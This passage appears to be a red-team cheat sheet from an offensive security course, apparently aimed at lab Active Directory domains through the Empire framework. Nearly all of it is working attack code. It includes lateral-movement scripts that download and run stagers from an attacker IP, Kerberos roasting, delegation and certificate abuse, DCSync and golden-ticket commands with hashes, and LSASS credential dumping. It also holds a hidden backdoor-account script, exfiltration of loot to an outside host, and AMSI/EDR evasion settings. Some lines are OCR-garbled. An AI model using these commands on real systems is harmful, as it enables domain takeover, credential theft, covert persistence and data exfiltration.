$a. Document. ActiveView. ExecuteShellCommand ("C: \Windows \System32\Window sPowerShell\v1.0\PowerShell.exe", $null, "iex (ir - useb http://10.9.254.6/pwnd) ","")

#Empire DCOM

```
```
powershell_management_spawnas
invoke_script

function Invoke-MMC20
{
[CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [string]$Target,
        [Parameter(Mandatory=$True)]
        [string] $Command
    )
    echo "executing $Command on $Target"
    $a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application",$Target))
    $a.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,$Command,"")

```
```
}
ScriptCmd:Invoke-MMC20 -Target hr01 -command "iex(iwr -useb http://<yourIP>:<yourport>/stager.ps1)"
ScriptPath:/home/sec565/tools/Invoke-MMC20.ps1 (unless you saved it somewhere else)


#Scheduled Tasks
function Invoke-SchTaskLatMove
{
[CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [string]$Target,
        [Parameter(Mandatory=$False)]
        [string] $TaskName = "WindowsUpdateTask",
        [Parameter(Mandatory=$True)]
        [string] $Command
    )
    echo "creating task $TaskName on $Target running as SYSTEM"
    C:\Windows\system32\schtasks.exe /create /tn $TaskName /tr "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe $Command" /sc once /st 00:00 /S $Target /RL Highest /RU "SYSTEM"
    echo "running task"
    C:\Windows\system32\schtasks.exe /run /tn $TaskName /S $Target
    echo "deleting task"
    C:\Windows\system32\schtasks.exe /F /delete /tn $TaskName /S $Target
    echo "all done, enjoy"
}

```
```
ScriptCmd:Invoke-SchTaskLatMove -Target hr01 -Command "iex(iwr -useb http://<YOURIP>:<YOURPORT>/stager.ps1)" 
ScriptPath: /home/sec565/tools/Invoke-SchTaskLatMove.ps1

#PSExec (opens smb, copy psexec, install service, uploads binary, executes -- noisy in logs
powershell_lateral_movement_invoke_psexec 

#SCM requires a special service binary
function Invoke-Update {
C:\Windows\system32\sc.exe \\hr01 create UpdateService binpath= "%comspec% /c <multi\launcher code here>"
C:\Windows\system32\sc.exe \\hr01 start UpdateService
C:\Windows\system32\sc.exe \\hr01 delete UpdateService
}
powershell_management_invoke_script 
- ScriptCmd:Invoke-Update 
- ScriptPath:/home/sec565/tools/Invoke-Update.ps1

```
## Domain Privileges Escalation  
### AS-REP Roast  
```
# pre-auth disabled is required

```
```
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView

```
```
execute-assembly Rubeus.exe asreproast /user:<Target> /nowrap

#crack it

```
```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt

```
### Kerberosting  
```
#check
setspn -L username
Get-ADUser -Identity <username> -Properties servicePrincipalName | Select-Object -ExpandProperty servicePrincipalName

# request a TGS for an account
rubeus.exe kerberoast /user:svc_migration /format:hashcat /rc4 /nowrap
hashcat -m 13100 '<full path to ticketfile>' -a0 '/home/sec565/Desktop/passwordlist.txt'   #basic passwords in the lab, try rockyou.txt


```
### Unconstrained Delegation  
```
Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation, ServicePrincipalName
Get-ADUser -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation

(userAccountControl:1.2.840.113556.1.4.803:=524288)
C: \> $Searcher = [adsisearcher]"(userAccountControl:1.2.840.113556.1.4.803:=524288)";$Searcher.FindAll() | ForEach-Object { $_.Properties.adspath }

```
```
C: \> ([adsisearcher]' (&jobjectcategory-computer) ((userAccountControl:1.2.840. 113556.1.4.803:=524288))) '). FindA11 ().GetDirectoryEntry () | Select-Object -Property
#PowerView
PS C: \> Get-DomainComputer -Unconstrained
#SharpView
PS C: \> Get-DomainComputer -Unconstrained

```
```
Get-ADTrust -Filter * | Select-Object Name, EnableTGTDelegation
# Query the raw trust attributes for the domain
Get-ADObject -Filter "objectClass -eq 'trustedDomain'" -Properties trustAttributes | Select-Object Name, trustAttributes
0x20 (32): WITHIN_FOREST — Standard for parent-child; historically allows delegation.
0x200 (512): CROSS_ORGANIZATION_NO_TGT_DELEGATION — Explicitly Blocked.
0x800 (2048): CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION — Explicitly Allowed

#monitor for a TGS klist purge first, then agent will freez
rubeus monitor /targetuser:DC01$ /interval:5 /runfor:120 /consoleoutfile:C:\Users\Public\tickets.txt /nowrap
monitor /targetuser:kingslanding$ /interval:5 /runfor:300 /consoleoutfile:"C:\Users\Public\tickets.txt" /nowrap

#on second agent
wget -O Invoke-SpoolSample.ps1 https://raw.githubusercontent.com/cybrd0ne/cybersec-toolsbox/refs/heads/main/offensive/565tools/Invoke-SpoolSample.ps1
Techniques:powershell_code_execution_invoke_script
Scriptcmd:Invoke-SpoolSample -Command "dc01 prod"
ScriptPath:/home/sec565/tools/Invoke-SpoolSample.ps1
powershell_exploitation_invoke_spoolsample
#second agent PetitPotam.exe
C:\Public\Users\PetitPotam.exe -d north.sevenkingdoms.local winterfell.north.sevenkingdoms.local kingslanding.sevenkingdoms.local


```
### Constrained Delegation  
```
PS C:\> ([adsisearcher] (userAccountControl:1.2.840.113556.1.4.803:=16777216) '). .FindA11 ().GetDirectoryEntry () | select name, msds-allowedtodelegateto
PS C: \> Get-DomainComputer -TrustedToAuth
C: \> SharpView.exe Get-DomainComputer -TrustedToAuth

C:\> Rubeus.exe s4/user: IIS 002 /rc4:63647965F13544C6551D5FDB7FFD13E0 /impersonateuser:Administrator /msdsspn: "cifs/DC01" /altservice: LDAP, LDAPS /ptt
PS C: \> ls \\DC01.asgard.corp\C$

```
```


```
### Resource Based Constrained Delegation  
```
PS C: \>([adsisearcher]"(msds-AllowedToActOnBehalf0fOtherIdentity=*)").FindAll().GetDirectoryEntry()|select name
PS C: \> Get-DomainComputer -Properties * | Where-Object msds-AllowedToActOnBehalfofotherIdentity -ne $null | select name
C: \> SharpHound. exe -C DCOnly
#PowerView
PS C: \> Find-InterestingDomainAcl | Where-Object IdentityReferenceName -eg $env:USERNAME
#ATTACK RBCD

```
```
Techniques:powershell_management_invoke_script from context of comprimised account with msDS-AllowedToActOnBehalfOfOtherIdentity write permissions - ScriptCmd:Invoke-StandIn -Command "--computer db01 --sid <SID_YOU_ENUMERATED of comprimised service account>"  - ScriptPath:/home/sec565/tools/Invoke-StandIn.ps1
#Rubeus to perform S4U2self, S4U2Proxy, and impersonate user to access servce
Techniques : csharp_assembly_assembly
File : <select Rubeus from the dropdown>
Parameters : s4u /user:svc_migration /rc4:BCD0D654E20EF7B7C68582A25E384605 /impersonateuser:almeria.zanelli /msdsspn:host/db01 /altservice:cifs,host /nowrap /ptt

```
### Active Directory Certificate Service  
```
Techniques:powershell_management_invoke_script
ScriptCmd:Invoke-Certify -Command "find /vulnerable"
ScriptPath:/home/sec565/tools/Invoke-Certify.ps1

```
```
bof_situational_awareness_adcs_enum

```
```

#request for the user that you impersonate e.g. Domain Admin
Techniques:powershell_management_invoke_script
ScriptCmd:Invoke-Certify -Command "request /template:UserAuthenticationCertificate /altname:almeria.zanelli /ca:dc01.draconem.corp\draconem-DC01-CA"
ScriptPath:/home/sec565/tools/Invoke-Certify.ps1
csharp_collection_certify


```
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
base64 cert.pfx | tr -d "\r\n" > rubeus_ready_file

Techniques: csharp_assembly_assembly
File:<select rubeus from drop down>
Parameters:asktgt /nowrap /user:almeria.zanelli /certificate:<rubeusinput> /ptt


```
### Escalate Priv Tickets  
```
# import TGS into session
#dcsync
Techniques : powershell/credentials/mimikatz/dcsync
User: draconem\krbtgt
dc : dc01.draconem.corp

# Extract krbtgt hash
lsadump::dcsync /domain:north.sevenkingdoms.local /user:krbtgt

# Extract trust key
lsadump::dcsync /domain:north.sevenkingdoms.local /user:SEVENKINGDOMS$

# List all tickets with detailed info
Rubeus.exe triage

# Dump specific ticket to file
Rubeus.exe dump /service:krbtgt /nowrap

# Or dump by LUID
Rubeus.exe dump /luid:0x[LUID_VALUE] /nowrap

#GOLDEN TICKET
kerberos::golden /user:Administrator /domain:north.sevenkingdoms.local /sid:S-1-5-21-2339848658-4075590924-2090061919 /sids:S-1-5-21-1409754491-4246775990-3914137275-519 /krbtgt:2c3e357db3f24b0dfbf98f6f6cc31125 /ptt
Rubeus.exe golden /rc4:13354bc6e1b48fff8d66a2090e909b27 /domain:north.sevenkingdoms.local /sid:S-1-5-21-638448100-4005671799-261795860 /user:robb.stark /id:500 /groups:512,513,518,519,520 /netbios:NORTH /ptt


usemodule credentials/mimikatz/golden_ticket
set Agent [YOUR_AGENT]
set user robb.stark
set domain north.sevenkingdoms.local
set sid S-1-5-21-638448100-4005671799-261795860
set krbtgt 13354bc6e1b48fff8d66a2090e909b27
execute


##child-parent
#Child domain SID
Import-Module .\PowerView.ps1; Get-DomainSID

```
```

#Parent domain SID
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"

```
```
SharpView: Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

# Get the SID of the parent domain with LOLBIN
nltest /domain_trusts /v

# Resolve the Parent Domain's "Administrator" account to get the Domain SID
$obj = New-Object System.Security.Principal.NTAccount("sevenkingdoms\Administrator")
$sid = $obj.Translate([System.Security.Principal.SecurityIdentifier])
$sid.Value

#check SID history filtering is disabled (False)
Get-ADTrust -Identity "sevenkingdoms.local" | Select-Object Name, SIDFilteringQuarantined


```
```
kerberos::golden /user:whocares /domain:north.sevenkingdoms.local /sid: S-1-5-21-2339848658-4075590924-2090061919 /sids: S-1-5-21-242681464-3930565181-3785256155-519 /krbtgt:2c3e357db3f24b0dfbf98f6f6cc31125 /service:krbtgt /target:sevenkingdoms.local /ptt"

```
```

Rubeus.exe golden /rc4:2c3e357db3f24b0dfbf98f6f6cc31125 /domain:north.sevenkingdoms.local /sid:S-1-5-21-2339848658-4075590924-2090061919 /sids:S-1-5-21-242681464-3930565181-3785256155-519 /user:whocares_user /service:krbtgt /target:sevenkingdoms.local /targetdomain:sevenkingdoms.local /netbios:NORTH /noldn /ptt

```
```

#verify

```
```
net group "Enterprise Admins" /domain:sevenkingdoms.local
dir \\kingslanding.sevenkingdoms.local\c$

```
### Dump LSA  
```
| **Dump LSA**     | Mimikatz  | `execute-assembly SafetyKatz.exe "sekurlsa::logonpasswords" "exit"` |
| ---------------- | --------- | ------------------------------------------------------------------- |
| **ACL Enum**     | PowerView | `Get-DomainUser -Identity <User> -Properties *                      |

```
### AD Persistence  
```
#Backdoor 1: Targeted Kerberoasting, run as high integrity

```
```
setspn -s cifs/allyourpasswordsbelongtous drew.dorwood   #consider service name that blends in
Attack: rubeus kerberost to grab user hash

#Backdoor 2: Hidden User with DCSync Privileges
#-new OU with hidden user in it

```
```
#-assign the backdoor user DCSync rights

```
```
#-deny the view permissions of the OU for everyone
function Invoke-SneakyBackDoor{
[CmdletBinding()]
    Param (
    [Parameter(Mandatory=$True)]
    [string]$OU,
    [Parameter(Mandatory=$True)]
    [string]$AccountName,
    [Parameter(Mandatory=$True)]
    [string]$Password
    )
$dse = [ADSI]"LDAP://Rootdse"
$namingcontext = $dse.defaultNamingContext
echo "Creating new OU $OU"
New-ADOrganizationalUnit -ProtectedFromAccidentalDeletion $False -Name $OU
echo "Creating new User $AccountName"
New-ADUser -Name $AccountName -AccountPassword (ConvertTo-SecureString $Password -AsPlainText -Force) -Enabled $True -Path "OU=$OU,$namingcontext"
echo "Giving $AccountName DCSync rights"
dsacls.exe $namingcontext /G $AccountName":CA;Replicating Directory Changes All" $AccountName":CA;Replicating Directory Changes" | Out-Null
echo "Removing all rights on $OU"
dsacls.exe "OU=$OU,$namingcontext" /D Everyone:LC | Out-Null
echo "Removing all reading rights on $AccountNAme"
dsacls.exe "CN=$AccountName,Ou=$OU,$namingcontext" /D Everyone:GAGR | Out-Null
}
Attack: Invoke-Mimikatz -command '"lsadump::dcsync /user:draconem\krbtgt"'

#Backdoor 3: Force Change Password
iex(irm -useb "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1")
Add-ObjectAcl -PrincipalIdentity Gareth.Kilgallen -TargetIdentity drew.dorwood -Rights ResetPassword -Verbose
#grants Gareth.Kilgallen the rights to reset the password of drew.dorwood whenever our backdoor user wants, without having to know Drew's password.
Technique:powershell_management_invoke_script  - ScriptCmd:Set-DomainUserPassword -Identity drew.dorwood -AccountPassword(ConvertTo-SecureString 'Test1234!' -AsPlainText -Force) -Verbose  - ScriptPath:/home/sec565/tools/PowerView.ps1

#Backdoor 4: Shadow Credentials
#abusing the msDS-KeyCredentialLink attribute of an object through PKINIT authentication
#https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
#prereqs:
#-The functional level of the domain needs to be Server 2016 or above.
#-AD CS needs to be deployed in the environment.
#-We need to have control over an account that has write privileges on the msDS-KeyCredentialLink attribute of an object
Techniques:powershell_management_invoke_script
ScriptCmd:Invoke-Whisker -Command "add /target:dc01$ /domain:draconem.corp /dc:dc01.draconem.corp"
ScriptPath:/home/sec565/tools/Invoke-Whisker.ps1

Techniques:csharp_assembly_assembly
File : <select Rubeus>
Command:asktgt /user:dc01$ /certificate:<whisker output> /password:<whisker output> /domain:draconem.corp /dc:dc01.draconem.corp /getcredentials /show

```
## Data Exfiltration  
```
CertReq -Post -config http://10.254.252.3:9001/ loot.txt
certutil -encode loot.txt loot.b64

#apply encryption
$plaintext = Get-Content loot.txt
$ss = New-Object System.Security.SecureString
foreach ($char in $plaintext.toCharArray()) { $ss.AppendChar($char) }
$key = (New-Object System.Text.ASCIIEncoding).GetBytes("MYSECRET!")
$ciphertext = ConvertFrom-SecureString -SecureString $ss -Key $key
Invoke-WebRequest -Uri http://10.254.252.3:9001/ -Method POST -Body $ciphertext

#decrypt
$key = (New-Object System.Text.ASCIIEncoding).GetBytes("MYSECRET!")
$encrypted = "76492d1116743f0423413b16050a5345MgB8AGgAVQAxAEMAbwA3AEYAMgBtAE4ATwBwAGoAZQBiAHEAZQBDAFcAVABzAHcAPQA9AHwAZgBjADYAMwBiADAAMgA0ADAAMgBiAGMAMQA3AGYAYgBmAGUAOAA3AGIAMQBhADgAMAAwADcAYwBhAGUAMgAxAGMAOAA3ADIANQBmADQANwBjAGEAMABjADAANwBkADAAYwA0ADMANgA3AGIAMwA1AGUAYwBiADYAZAA4ADkAMgBhAGMAMgAxADYAMAAyAGYAMwAwADUAYQA4AGUANAA0ADYANABhADYANwA1ADgAOQBjAGUANQA4ADUAYwAzAGMA"
$ss = ConvertTo-SecureString -key $key -String $encrypted
$Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($ss)
$result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
$result

#using ssh
type loot.txt | ssh user@10.254.252.3 "cat > loot.txt"

```
## Empire Obfuscation   
```
Best for AMSI Bypass: Token\Member\2,Token\Variable\1 (Focuses on hiding the "what").
Best for EDR/Log Bypass: Launcher\Stdin++\234 (Focuses on hiding the "how").
Best for Email/Macro Delivery: Compress\1,Token\String\3 (Focuses on minimizing size while hiding keywords).

```
## Resources  
SANS 565: [https://github.com/cybrd0ne/cybersec-toolsbox/tree/main/offensive/565tools](https://github.com/cybrd0ne/cybersec-toolsbox/tree/main/offensive/565tools)  
[https://notes.cavementech.com/pentesting-quick-reference/active-directory/domain-trusts/attacking-domain-trusts-child-greater-than-parent-trusts-from-windows](https://notes.cavementech.com/pentesting-quick-reference/active-directory/domain-trusts/attacking-domain-trusts-child-greater-than-parent-trusts-from-windows)  
[https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)  
[https://adsecurity.org/?p=2011](https://adsecurity.org/?p=2011)  
